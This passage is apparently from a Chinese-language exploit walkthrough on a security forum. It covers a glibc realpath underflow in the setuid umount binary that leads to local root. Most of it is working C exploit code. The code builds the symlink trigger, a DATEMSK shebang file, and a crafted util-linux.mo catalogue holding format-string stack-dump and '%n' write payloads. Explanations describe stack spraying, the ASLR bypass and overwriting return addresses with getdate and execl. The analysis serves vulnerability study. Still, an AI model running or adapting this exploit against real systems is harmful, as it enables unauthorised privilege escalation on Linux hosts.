
```
// Create directories needed for umount to proceed to final state

// "not mounted".

  createDirectoryRecursive(namespaceMountBaseDir, "(unreachable)/x");

  result=snprintf(pathBuffer, sizeof(pathBuffer),

      "(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES", osReleaseExploitData[2]);

  assert(result<PATH_MAX);

  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);

  result=snprintf(pathBuffer, sizeof(pathBuffer),

      "(unreachable)/tmp/%s/X.X/LC_MESSAGES", osReleaseExploitData[2]);

  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);

  result=snprintf(pathBuffer, sizeof(pathBuffer),

      "(unreachable)/tmp/%s/X.x/LC_MESSAGES", osReleaseExploitData[2]);

  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
```

![](https://bbs.kanxue.com/upload/attach/202002/734571_FBD5S7JX7Q7PS2A.png)

## 3.创建`../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A`到`/proc/5600/cwd/(unreachable)/tmp/down`的符号链接用来触发溢出。

```
// Create symlink to trigger underflows.

  result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/(unreachable)/tmp/down",

      namespaceMountBaseDir);

  assert(result<PATH_MAX);

  result=symlink(osReleaseExploitData[1], pathBuffer);

  assert(!result||(errno==EEXIST));
```

## 4.创建`/proc/5600/cwd/DATEMSK`并向其中写入shebang(即“#!”)加上漏洞利用程序的路径，`getdate`会使用环境变量`DATEMSK`定义的路径名中的格式，会在下一个部分中用到它。

```
// getdate will leave that string in rdi to become the filename

// to execute for the next round.

  char *selfPathName=realpath("/proc/self/exe", NULL);

  result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/DATEMSK",

      namespaceMountBaseDir);

  assert(result<PATH_MAX);

  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);

  assert(handle>0);

  result=snprintf(pathBuffer, sizeof(pathBuffer), "#!%s\nunused",

      selfPathName);

  assert(result<PATH_MAX);

  result=write(handle, pathBuffer, result);

  close(handle);

  free(selfPathName);
```

## 5.创建`/proc/5600/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo`并向其中写入需要的数据。

```
// Write the initial message catalogue to trigger stack dumping

// and to make the "umount" call privileged by toggling the "restricted"

// flag in the context.

  result=snprintf(pathBuffer, sizeof(pathBuffer),

      "%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo",

      namespaceMountBaseDir, osReleaseExploitData[2]);

  assert(result<PATH_MAX);



  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));

  assert(stackDumpStr);

  char *stackDumpStrEnd=stackDumpStr;

  stackDumpStrEnd+=sprintf(stackDumpStrEnd, "AA%%%d$lnAAAAAA",

      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);

  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {

    memcpy(stackDumpStrEnd, "%016lx", 6);

    stackDumpStrEnd+=6;

  }

// We wrote allready 8 bytes, write so many more to produce a

// count of 'L' and write that to the stack. As all writes so

// sum up to a count aligned by 8, and 'L'==0x4c, we will have

// to write at least 4 bytes, which is longer than any "%hhx"

// format string output. Hence do not care about the byte content

// here. The target write address has a 16 byte alignment due

// to varg structure.

  stackDumpStrEnd+=sprintf(stackDumpStrEnd, "%%1$%dhhx%%%d$hhn",

      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,

      STACK_LONG_DUMP_BYTES/16);

  *stackDumpStrEnd=0;

  result=writeMessageCatalogue(pathBuffer,

      (char*[]){

          "%s: mountpoint not found",

          "%s: not mounted",

          "%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)"

      },

      (char*[]){"1234", stackDumpStr, "5678"},

      3);

  assert(!result);

  free(stackDumpStr);
```

转成`po`文件之后查看内容如下。

![](https://bbs.kanxue.com/upload/attach/202002/734571_ZSCTMMAH2K989F3.png)

## 6.创建`/proc/5600/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.X/LC_MESSAGES/util-linux.mo`。

```
  result=snprintf(pathBuffer, sizeof(pathBuffer),

      "%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo",

      namespaceMountBaseDir, osReleaseExploitData[2]);

  assert(result<PATH_MAX);

  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);

  assert((!result)||(errno==EEXIST));

  secondPhaseTriggerPipePathname=strdup(pathBuffer);



  result=snprintf(pathBuffer, sizeof(pathBuffer),

      "%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo",

      namespaceMountBaseDir, osReleaseExploitData[2]);

  secondPhaseCataloguePathname=strdup(pathBuffer);



  free(namespaceMountBaseDir);

  return(namespacedProcessPid);
```

### `attemptEscalation`中主要做了下面这些事情。

1.在`fork`的子进程中设置大量`AANGUAGE = X.X`环境变量喷射栈，`umount`调用`realpath`发生溢出时加载了前面设置的`mo`文件，格式化字符串把栈`dump`到`stderr`，修改`restricted`标志位并把`AANGUAGE = X.X`改成`LANGUAGE = X.X`。

![](https://bbs.kanxue.com/upload/attach/202002/734571_TURM79XB679PP2A.png)

2.父进程分为下面几个阶段：

#### 第零阶段寻找溢出后的8个A定位数据的位置。
```
        case 0: // Initial sync: read A*8 preamble.

          if(readDataLength<8)

            continue;

          char *preambleStart=memmem(readBuffer, readDataLength,

              "AAAAAAAA", 8);

          if(!preambleStart) {

// No preamble, move content only if buffer is full.

            if(readDataLength==sizeof(readBuffer))

              moveLength=readDataLength-7;

            break;

          }

// We found, what we are looking for. Start reading the stack.

          escalationPhase++;

          moveLength=preambleStart-readBuffer+8;
```

![](https://bbs.kanxue.com/upload/attach/202002/734571_T5XCVJVACU63933.png)

#### 第一阶段读取栈上的数据绕过ASLR，找到`libc`基地址后将返回地址改成`getdate`和`execl`的地址，然后把这些信息写入`/proc/5600/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.X/LC_MESSAGES/util-linux.mo`。
